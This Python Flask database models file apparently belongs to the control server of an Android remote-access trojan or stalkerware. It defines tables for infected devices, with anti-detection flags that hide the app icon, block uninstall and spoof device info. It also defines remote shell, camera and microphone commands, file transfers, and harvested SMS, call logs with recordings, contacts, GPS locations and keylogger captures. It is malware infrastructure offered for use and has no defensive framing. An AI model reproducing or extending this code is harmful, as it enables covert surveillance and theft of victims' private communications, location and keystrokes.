from datetime import datetime
from app import db
from flask_login import UserMixin

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(64), unique=True, nullable=False)
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(256), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_login = db.Column(db.DateTime)
    
    # Relationships
    devices = db.relationship('Device', backref='user', lazy=True)
    
    def __repr__(self):
        return f'<User {self.username}>'

class Device(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(64), unique=True, nullable=False)
    name = db.Column(db.String(64))
    android_version = db.Column(db.String(32))
    api_level = db.Column(db.Integer)
    model = db.Column(db.String(64))
    manufacturer = db.Column(db.String(64))
    ip_address = db.Column(db.String(45))
    phone_number = db.Column(db.String(20))
    imei = db.Column(db.String(20))
    is_rooted = db.Column(db.Boolean, default=False)
    is_emulator = db.Column(db.Boolean, default=False)
    last_online = db.Column(db.DateTime)
    is_online = db.Column(db.Boolean, default=False)
    first_seen = db.Column(db.DateTime, default=datetime.utcnow)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    
    # Anti-detection settings
    hide_app_icon = db.Column(db.Boolean, default=False)
    prevent_uninstall = db.Column(db.Boolean, default=False)
    spoof_device_info = db.Column(db.Boolean, default=False)
    
    # Relationships
    commands = db.relationship('Command', backref='device', lazy=True)
    file_transfers = db.relationship('FileTransfer', backref='device', lazy=True)
    sms_messages = db.relationship('SmsMessage', backref='device', lazy=True)
    call_logs = db.relationship('CallLog', backref='device', lazy=True)
    contacts = db.relationship('Contact', backref='device', lazy=True)
    locations = db.relationship('Location', backref='device', lazy=True)
    
    def __repr__(self):
        return f'<Device {self.device_id}>'

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    command_text = db.Column(db.Text, nullable=False)
    type = db.Column(db.String(32), default='shell')  # shell, file_download, file_upload, camera, mic, etc.
    status = db.Column(db.String(32), default='pending')  # pending, executed, failed
    result = db.Column(db.Text)
    error = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    executed_at = db.Column(db.DateTime)
    device_id = db.Column(db.Integer, db.ForeignKey('device.id'), nullable=False)
    
    def __repr__(self):
        return f'<Command {self.id}: {self.command_text[:20]}...>'

class FileTransfer(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    file_path = db.Column(db.String(256), nullable=False)
    file_name = db.Column(db.String(128), nullable=False)
    file_size = db.Column(db.Integer)
    direction = db.Column(db.String(16), nullable=False)  # upload or download
    status = db.Column(db.String(32), default='pending')  # pending, completed, failed
    error = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    completed_at = db.Column(db.DateTime)
    device_id = db.Column(db.Integer, db.ForeignKey('device.id'), nullable=False)
    
    def __repr__(self):
        return f'<FileTransfer {self.id}: {self.file_name}>'

class SmsMessage(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    message_id = db.Column(db.String(64))
    address = db.Column(db.String(20))  # Phone number
    body = db.Column(db.Text)
    date = db.Column(db.DateTime)
    type = db.Column(db.Integer)  # 1: Inbox, 2: Sent, etc.
    read = db.Column(db.Boolean, default=False)
    collected_at = db.Column(db.DateTime, default=datetime.utcnow)
    device_id = db.Column(db.Integer, db.ForeignKey('device.id'), nullable=False)
    
    def __repr__(self):
        return f'<SMS {self.id}: {self.body[:20]}...>'

class CallLog(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    call_id = db.Column(db.String(64))
    number = db.Column(db.String(20))
    name = db.Column(db.String(64))
    date = db.Column(db.DateTime)
    duration = db.Column(db.Integer)  # in seconds
    type = db.Column(db.Integer)  # 1: Incoming, 2: Outgoing, 3: Missed
    recording_path = db.Column(db.String(256))  # Path to recording if available
    collected_at = db.Column(db.DateTime, default=datetime.utcnow)
    device_id = db.Column(db.Integer, db.ForeignKey('device.id'), nullable=False)
    
    def __repr__(self):
        return f'<Call {self.id}: {self.number}>'

class Contact(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    contact_id = db.Column(db.String(64))
    name = db.Column(db.String(64))
    phone_numbers = db.Column(db.Text)  # Stored as JSON
    emails = db.Column(db.Text)  # Stored as JSON
    collected_at = db.Column(db.DateTime, default=datetime.utcnow)
    device_id = db.Column(db.Integer, db.ForeignKey('device.id'), nullable=False)
    
    def __repr__(self):
        return f'<Contact {self.id}: {self.name}>'

class Location(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    latitude = db.Column(db.Float)
    longitude = db.Column(db.Float)
    accuracy = db.Column(db.Float)
    altitude = db.Column(db.Float)
    speed = db.Column(db.Float)
    address = db.Column(db.Text)
    collected_at = db.Column(db.DateTime, default=datetime.utcnow)
    device_id = db.Column(db.Integer, db.ForeignKey('device.id'), nullable=False)
    
    def __repr__(self):
        return f'<Location {self.id}: {self.latitude}, {self.longitude}>'

class KeylogEntry(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    application = db.Column(db.String(64))
    text = db.Column(db.Text)
    captured_at = db.Column(db.DateTime)
    collected_at = db.Column(db.DateTime, default=datetime.utcnow)
    device_id = db.Column(db.Integer, db.ForeignKey('device.id'), nullable=False)
    
    def __repr__(self):
        return f'<Keylog {self.id}: {self.application}>'
